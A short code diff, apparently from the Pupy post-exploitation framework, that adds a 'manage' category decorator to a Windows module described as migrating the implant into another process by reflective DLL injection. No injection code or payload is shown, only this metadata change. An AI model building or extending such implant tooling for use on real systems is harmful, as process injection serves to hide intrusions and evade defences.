@@ -9,6 +9,7 @@ __class_name__="MigrateModule"
 
 
 @compatibility("windows")
+@category("manage")
 class MigrateModule(PupyModule):
 	""" Migrate pupy into another process using reflective DLL injection """
 	max_clients=1
